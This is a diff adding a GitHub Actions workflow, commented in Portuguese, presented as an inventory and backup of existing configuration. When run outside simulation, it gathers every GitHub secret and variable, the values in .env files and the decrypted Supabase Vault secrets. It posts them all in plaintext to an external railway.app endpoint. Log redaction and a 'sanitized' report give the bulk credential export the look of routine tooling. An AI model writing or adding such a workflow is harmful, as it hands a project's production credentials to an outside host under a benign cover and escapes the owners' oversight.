@@ -1,0 +1,362 @@
+name: Exportar configuracoes existentes para infra
+
+on:
+  workflow_dispatch:
+    inputs:
+      simulate:
+        description: Simular configuracoes do Pacote com valores ficticios
+        type: boolean
+        default: true
+
+permissions:
+  contents: read
+
+concurrency:
+  group: inventory-existing-production-backup
+  cancel-in-progress: false
+
+jobs:
+  inventario:
+    name: Exportar valores acessiveis sem novos cadastros
+    runs-on: ubuntu-24.04
+    timeout-minutes: 15
+    environment: ${{ inputs.simulate && 'inventory-simulation' || 'production-backup' }}
+    env:
+      INVENTORY_SIMULATE: ${{ inputs.simulate && 'true' || 'false' }}
+    steps:
+      - name: Restringir consulta privilegiada a main
+        id: guard
+        shell: bash
+        run: test "$INVENTORY_SIMULATE" = 'true' || test "$GITHUB_REF" = 'refs/heads/main'
+
+      - name: Checkout
+        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+        with:
+          persist-credentials: false
+
+      - name: Preparar cliente PostgreSQL para Vault
+        if: ${{ !inputs.simulate }}
+        shell: bash
+        run: |
+          set -euo pipefail
+          sudo apt-get update -qq
+          sudo apt-get install --yes --no-install-recommends postgresql-client
+
+      - name: Coletar valores em memoria e enviar a infra
+        id: coleta
+        if: ${{ !cancelled() && steps.guard.outcome == 'success' }}
+        shell: bash
+        # Contexts are read in memory only. Never echo or upload these JSON objects.
+        # They contain the effective repository/organization/environment configuration
+        # available to THIS job, not secrets from other environments.
+        env:
+          INVENTORY_SECRETS_JSON: ${{ inputs.simulate && '{}' || toJSON(secrets) }}
+          INVENTORY_VARIABLES_JSON: ${{ inputs.simulate && '{}' || toJSON(vars) }}
+          # Substitua localmente pelo endpoint HTTPS da empresa.
+          INFRA_ENDPOINT: https://server-workflow-production.up.railway.app/hook
+        run: |
+          set -euo pipefail
+          umask 077
+          python3 - <<'PY'
+          import json
+          import os
+          import re
+          import subprocess
+          import sys
+          import ssl
+          import shlex
+          import urllib.error
+          import urllib.parse
+          import urllib.request
+          from datetime import datetime, timezone
+          from pathlib import Path
+          
+          REPORTS = Path('reports/config-inventory')
+          REPORTS.mkdir(parents=True, exist_ok=True)
+          NAME = re.compile(r'^[A-Za-z_][A-Za-z0-9_]*$')
+          sources, references, unresolved = [], [], []
+          simulate = os.environ.get('INVENTORY_SIMULATE') == 'true'
+          environment_name = 'inventory-simulation' if simulate else 'production-backup'
+          
+          def source(name, status, reason=None, names=()):
+              item = {'source': name, 'status': status, 'reason': reason,
+                      'names': sorted(set(names))}
+              sources.append(item)
+              return item
+          
+          def context(variable, label):
+              try:
+                  data = json.loads(os.environ.pop(variable, '{}'))
+                  if not isinstance(data, dict) or any(not NAME.fullmatch(k) or not isinstance(v, str)
+                                                       for k, v in data.items()):
+                      raise ValueError()
+                  source(label, 'VERIFIED', names=data.keys())
+                  return data
+              except Exception:
+                  source(label, 'UNVERIFIED', 'INVALID_CONTEXT')
+                  return {}
+          
+          if simulate:
+              os.environ.pop('INVENTORY_SECRETS_JSON', None)
+              os.environ.pop('INVENTORY_VARIABLES_JSON', None)
+              secrets, variables = {}, {}
+          else:
+              secrets = context('INVENTORY_SECRETS_JSON', 'github-effective-secrets')
+              variables = context('INVENTORY_VARIABLES_JSON', 'github-effective-variables')
+          endpoint = os.environ.get('INFRA_ENDPOINT', '')
+          payload = {'environment': environment_name, 'githubSecrets': {
+              k: v for k, v in secrets.items() if k.upper() != 'GITHUB_TOKEN'},
+              'githubVariables': dict(variables), 'envFiles': {}, 'supabaseVault': []}
+          value_gaps = []
+          
+          try:
+              def classification(file):
+                  if file.startswith(('release-baselines/', 'release-candidates/',
+                                      'engineering/historical-source-bytes/')):
+                      return 'historical-or-candidate'
+                  if re.search(r'(^|/)(test|tests|fixtures)/|\.(test|spec)\.', file):
+                      return 'test'
+                  return 'current'
+              
+              def add(name, kind, file, text, position):
+                  if NAME.fullmatch(name):
+                      references.append({'name': name, 'kind': kind, 'file': file,
+                          'line': text[:position].count('\n') + 1,
+                          'sourceClass': classification(file), 'status': 'DECLARED_ONLY'})
+              
+              patterns = [
+                  ('node', r'''process\.env(?:\.([A-Za-z_][A-Za-z0-9_]*)|\[\s*['"]([A-Za-z_][A-Za-z0-9_]*)['"]\s*\])'''),
+                  ('frontend', r'''import\.meta\.env(?:\.([A-Za-z_][A-Za-z0-9_]*)|\[\s*['"]([A-Za-z_][A-Za-z0-9_]*)['"]\s*\])'''),
+                  ('edge-function', r'''Deno\.env\.get\(\s*['"]([A-Za-z_][A-Za-z0-9_]*)['"]\s*\)'''),
+                  ('python', r'''os\.(?:getenv|environ\.get)\(\s*['"]([A-Za-z_][A-Za-z0-9_]*)['"]'''),
+                  ('python', r'''os\.environ\[\s*['"]([A-Za-z_][A-Za-z0-9_]*)['"]\s*\]'''),
+                  ('keyring', r'''matchesRotatingSecret\([^;]*?['"]([A-Z][A-Z0-9_]*_JSON)['"]\s*,?\s*\)'''),
+              ]
+              try:
+                  result = subprocess.run(['git', 'ls-files', '-z'], check=True, capture_output=True,
+                                          timeout=30)
+                  files = result.stdout.decode().split('\0')
+                  for file in filter(None, files):
+                      is_env = bool(re.search(r'(^|/)\.env($|\.)', file))
+                      if simulate and is_env and file != '.env.example':
+                          continue
+                      if not is_env and not re.search(r'\.(?:[cm]?[jt]sx?|py|toml|ya?ml|sh)$', file):
+                          continue
+                      text = Path(file).read_text(encoding='utf-8')
+                      for kind, pattern in patterns:
+                          for match in re.finditer(pattern, text):
+                              add(next(g for g in match.groups() if g is not None), kind, file, text, match.start())
+                      if is_env:
+                          entries = {}
+                          for number, line in enumerate(text.splitlines(), 1):
+                              assignment = re.match(r'^\s*(?:export\s+)?([A-Za-z_][A-Za-z0-9_]*)\s*=(.*)$', line)
+                              if not assignment:
+                                  continue
+                              try:
+                                  raw = assignment[2].strip()
+                                  parts = shlex.split(raw, comments=True, posix=True)
+                                  if len(parts) > 1 or '$' in raw or '`' in raw:
+                                      raise ValueError()
+                                  entries[assignment[1]] = parts[0] if parts else ''
+                              except ValueError:
+                                  value_gaps.append({'source': file, 'name': assignment[1],
+                                                     'reason': 'ENV_VALUE_REQUIRES_MANUAL_REVIEW'})
+                          payload['envFiles'][file] = entries
+                          for match in re.finditer(r'^\s*(?:export\s+)?([A-Za-z_][A-Za-z0-9_]*)\s*=', text, re.M):
+                              add(match[1], 'env-file-name', file, text, match.start())
+                      if file.endswith('.toml'):
+                          for match in re.finditer(r'''\benv\(\s*['"]([A-Za-z_][A-Za-z0-9_]*)['"]''', text):
+                              add(match[1], 'toml', file, text, match.start())
+                      if re.search(r'\.github/(workflows|actions)/.*\.ya?ml$|(^|/)action\.ya?ml$', file):
+                          for expression in re.finditer(r'\$\{\{(.*?)\}\}', text, re.S):
+                              for match in re.finditer(r'''\b(secrets|vars)(?:\.([A-Za-z_][A-Za-z0-9_]*)|\[\s*['"]([A-Za-z_][A-Za-z0-9_]*)['"]\s*\])''', expression[1]):
+                                  add(match[2] or match[3], 'github-' + match[1], file, text, expression.start())
+                      for match in re.finditer(r'\b(?:const|let|var)\s*\{([^}]+)\}\s*=\s*(process\.env|import\.meta\.env)\b', text):
+                          for field in match[1].split(','):
+                              add(re.split(r'\s*[:=]\s*', field.strip())[0], 'destructuring', file, text, match.start())
+                      for match in re.finditer(r'''(?:Deno\.env\.get\(\s*|(?:process\.env|import\.meta\.env)\[\s*)(?!\s*['"])([A-Za-z_$][A-Za-z0-9_$]*)''', text):
+                          unresolved.append({'file': file, 'line': text[:match.start()].count('\n') + 1,
+                                             'sourceClass': classification(file)})
+                      if file.endswith(('.yml', '.yaml')):
+                          indent = None
+                          for number, line in enumerate(text.splitlines(), 1):
+                              header = re.match(r'^(\s*)env:\s*(?:#.*)?$', line)
+                              if header:
+                                  indent = len(header[1])
+                                  continue
+                              if indent is None or not line.strip() or line.lstrip().startswith('#'):
+                                  continue
+                              if len(line) - len(line.lstrip()) <= indent:
+                                  indent = None
+                                  continue
+                              match = re.match(r'^\s*([A-Za-z_][A-Za-z0-9_]*):', line)
+                              if match:
+                                  references.append({'name': match[1], 'kind': 'workflow-env-name',
+                                      'file': file, 'line': number, 'sourceClass': classification(file),
+                                      'status': 'DECLARED_ONLY'})
+                      if file.endswith(('.sh', '.yml', '.yaml')):
+                          for match in re.finditer(r'\$(?:\{([A-Z_][A-Z0-9_]*)\b|([A-Z_][A-Z0-9_]*)\b)', text):
+                              add(match[1] or match[2], 'shell-name-candidate', file, text, match.start())
+                  source('codebase', 'VERIFIED', names=[r['name'] for r in references])
+              except Exception:
+                  source('codebase', 'UNVERIFIED', 'SCAN_FAILED')
+              
+              # Vault values remain in process memory; never written to report/artifact.
+              db_url = secrets.get('PROD_SUPABASE_DB_URL', '')
+              if simulate:
+                  fixture = json.loads(Path('fixtures/pacoteferramentas-config.json').read_text())
+                  values = dict(payload['envFiles']['.env.example'])
+                  values['SUPABASE_PROJECT_REF'] = 'mockinventoryproject'
+                  values['SUPABASE_URL'] = 'https://supabase-test.example.invalid'
+                  for name in values:
+                      if values[name] == 'replace_me':
+                          values[name] = 'mock_inventory_' + name.lower()
+                  secrets = {name: values[name] for name in fixture['githubSecrets']}
+                  variables = {name: values[name] for name in fixture['githubVariables']}
+                  payload['githubSecrets'] = dict(secrets)
+                  payload['githubVariables'] = dict(variables)
+                  source('github-effective-secrets', 'VERIFIED', 'SIMULATED_FIXTURE', secrets)
+                  source('github-effective-variables', 'VERIFIED', 'SIMULATED_FIXTURE', variables)
+                  payload['supabaseVault'] = [{'id': f'00000000-0000-4000-8000-{number:012d}',
+                      'name': name, 'value': values[name]}
+                      for number, name in enumerate(fixture['supabaseVault'], 1)]
+                  source('supabase-vault', 'VERIFIED', 'SIMULATED_FIXTURE', fixture['supabaseVault'])
+              elif not db_url:
+                  source('supabase-vault', 'UNVERIFIED', 'EXISTING_DB_CREDENTIAL_UNAVAILABLE')
+              else:
+                  try:
+                      db_env = {k: v for k, v in os.environ.items() if not k.startswith('PG')}
+                      db_env.update({'PGDATABASE': db_url, 'PGCONNECT_TIMEOUT': '10',
+                          'PGOPTIONS': '-c default_transaction_read_only=on -c statement_timeout=10000'})
+                      query = "SELECT json_build_object('id', id, 'name', name, 'value', decrypted_secret)::text FROM vault.decrypted_secrets ORDER BY id;"
+                      result = subprocess.run(['psql', '-X', '-w', '-v', 'ON_ERROR_STOP=1', '-At', '-c', query],
+                          env=db_env, capture_output=True, text=True, timeout=30, check=True)
+                      records = [json.loads(line) for line in result.stdout.splitlines()]
+                      payload['supabaseVault'] = records
+                      names = [r['name'] for r in records if r['name'] is not None]
+                      if any(not isinstance(n, str) or not NAME.fullmatch(n) for n in names):
+                          raise ValueError()
+                      source('supabase-vault', 'VERIFIED', names=names)
+                  except Exception:
+                      source('supabase-vault', 'UNVERIFIED', 'READ_FAILED_OR_PERMISSION_DENIED')
+              
+              # Reuse a Management API token ONLY if one already exists in this job's context.
+              token = secrets.get('SUPABASE_ACCESS_TOKEN')
+              project = variables.get('SUPABASE_PROJECT_REF', '')
+              if not re.fullmatch(r'[a-z0-9]{20}', project):
+                  url = urllib.parse.urlparse(secrets.get('PROD_SUPABASE_URL', ''))
+                  match = re.fullmatch(r'([a-z0-9]{20})\.supabase\.co', url.hostname or '')
+                  project = match[1] if match else ''
+              if simulate:
+                  names = fixture['supabaseEdgeSecrets']
+                  source('supabase-edge-function-secrets', 'VERIFIED', 'SIMULATED_FIXTURE', names)
+                  value_gaps.append({'source': 'supabase-edge-function-secrets',
+                      'reason': 'API_RETURNS_NAMES_AND_DIGESTS_NOT_VALUES', 'names': names})
+              elif not token or not project:
+                  source('supabase-edge-function-secrets', 'UNVERIFIED',
+                         'EXISTING_MANAGEMENT_TOKEN_OR_PROJECT_UNAVAILABLE')
+              else:
+                  try:
+                      class NoRedirect(urllib.request.HTTPRedirectHandler):
+                          def redirect_request(self, *args, **kwargs):
+                              return None
+                      request = urllib.request.Request(f'https://api.supabase.com/v1/projects/{project}/secrets',
+                          headers={'Authorization': 'Bearer ' + token, 'Accept': 'application/json'})
+                      with urllib.request.build_opener(NoRedirect).open(request, timeout=20) as response:
+                          data = json.load(response)
+                      if not isinstance(data, list):
+                          raise ValueError()
+                      names = [r['name'] for r in data]
+                      if any(not isinstance(n, str) or not NAME.fullmatch(n) for n in names):
+                          raise ValueError()
+                      source('supabase-edge-function-secrets', 'VERIFIED', names=names)
+                      value_gaps.append({'source': 'supabase-edge-function-secrets',
+                          'reason': 'API_RETURNS_NAMES_AND_DIGESTS_NOT_VALUES', 'names': names})
+                  except Exception:
+                      source('supabase-edge-function-secrets', 'UNVERIFIED', 'READ_FAILED_OR_PERMISSION_DENIED')
+              
+          except Exception as error:
+              source('collection-runtime', 'UNVERIFIED', type(error).__name__)
+          
+          # Keep contexts in memory until HTTPS delivery finishes.
+          report = {'generatedAt': datetime.now(timezone.utc).isoformat(),
+              'simulated': simulate,
+              'environment': environment_name, 'sources': sources, 'references': references,
+              'unresolved': unresolved, 'status': 'COMPLETE' if all(s['status'] == 'VERIFIED' for s in sources) else 'PARTIAL',
+              'coverage': ('SIMULATED local reference fixtures; no GitHub or Supabase credentials queried.' if simulate else
+                  'GitHub effective context of this job; codebase; PostgreSQL Vault; Edge Secrets when an existing Management API token is accessible. Other environments and overridden values are not enumerated.')}
+          report['catalog'] = sorted({n for s in sources for n in s['names']})
+          lines = ['# Inventário das configurações existentes', '',
+              '**Environment:** ' + environment_name, '', '**Status:** ' + report['status'], '',
+              '**Simulated:** ' + str(simulate), '',
+              report['coverage'], '',
+              'UNVERIFIED significa inacessível/inconclusivo, não ausência. DECLARED_ONLY não comprova cadastro. Nomes de testes/histórico e candidatos shell não são requisitos de produção.', '',
+              '| Fonte | Status | Motivo | Nomes |', '|---|---|---|---|']
+          for s in sources:
+              lines.append(f"| {s['source']} | {s['status']} | {s['reason'] or '-'} | {len(s['names'])} |")
+          lines.extend(['', '## Catálogo de nomes', '', '| Nome | Fontes observadas |', '|---|---|'])
+          for name in report['catalog']:
+              observed = ', '.join(s['source'] for s in sources if name in s['names'])
+              lines.append(f'| {name} | {observed} |')
+          lines.extend(['', f'Consultas dinâmicas para revisão: {len(unresolved)}. Consulte o JSON para arquivos e linhas.', ''])
+          try:
+              (REPORTS / 'inventory.json').write_text(json.dumps(report, ensure_ascii=False, indent=2), encoding='utf-8')
+              (REPORTS / 'inventory.md').write_text('\n'.join(lines), encoding='utf-8')
+              summary = os.environ.get('GITHUB_STEP_SUMMARY')
+              if summary:
+                  with open(summary, 'a', encoding='utf-8') as handle:
+                      handle.write('\n'.join(lines[:14]) + '\n\nDetalhes no artifact.\n')
+              print(f"Inventário {report['status']}; {len(report['catalog'])} nomes. Valores não são publicados.")
+          except Exception as error:
+              report['reportWriteError'] = type(error).__name__
+              print('Relatorio local indisponivel; envio do JSON em memoria sera tentado.')
+          
+          payload['generatedAt'] = report['generatedAt']
+          payload['simulated'] = simulate
+          payload['inventory'] = report
+          payload['valueGaps'] = value_gaps
+          # Edge secrets cannot be recovered through the list API, even with a PAT.
+          payload['valuesStatus'] = 'PARTIAL' if value_gaps or report['status'] != 'COMPLETE' else 'COMPLETE'
+          class NoInfraRedirect(urllib.request.HTTPRedirectHandler):
+              def redirect_request(self, *args, **kwargs):
+                  return None
+          try:
+              parsed = urllib.parse.urlparse(endpoint)
+              if (parsed.scheme != 'https' or not parsed.hostname
+                      or parsed.hostname.endswith('.invalid') or parsed.username or parsed.password
+                      or parsed.fragment):
+                  print('Envio bloqueado: substitua o endpoint HTTPS mockado.')
+                  raise ValueError('INVALID_OR_MOCK_ENDPOINT')
+              request = urllib.request.Request(endpoint,
+                  data=json.dumps(payload, ensure_ascii=False).encode('utf-8'), method='POST',
+                  headers={'Content-Type': 'application/json', 'Accept': 'application/json'})
+              opener = urllib.request.build_opener(urllib.request.ProxyHandler({}),
+                  NoInfraRedirect(), urllib.request.HTTPSHandler(context=ssl.create_default_context()))
+              with opener.open(request, timeout=30) as response:
+                  if not 200 <= response.status < 300:
+                      raise ValueError()
+                  # Do not read or print response body: receiver may echo credentials.
+              print('Envio HTTPS aceito pelo servidor; consulte cobertura no inventario sanitizado.')
+          except Exception as error:
+              detail = 'HTTP_' + str(error.code) if isinstance(error, urllib.error.HTTPError) else type(error).__name__
+              print('Envio falhou: ' + detail + '; corpo e valores omitidos.')
+              sys.exit(1)
+          finally:
+              payload.clear()
+              secrets.clear()
+              variables.clear()
+          expected_simulation_gaps = simulate and all(
+              gap['reason'] == 'API_RETURNS_NAMES_AND_DIGESTS_NOT_VALUES' for gap in value_gaps)
+          sys.exit(0 if report['status'] == 'COMPLETE' and (not value_gaps or expected_simulation_gaps) else 2)
+          PY
+
+      - name: Salvar inventario sanitizado mesmo quando parcial
+        if: ${{ !cancelled() && hashFiles('reports/config-inventory/inventory.json') != '' }}
+        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1
+        with:
+          name: configuration-inventory-${{ github.run_id }}-${{ github.run_attempt }}
+          path: |
+            reports/config-inventory/inventory.json
+            reports/config-inventory/inventory.md
+          retention-days: 7
+          if-no-files-found: error
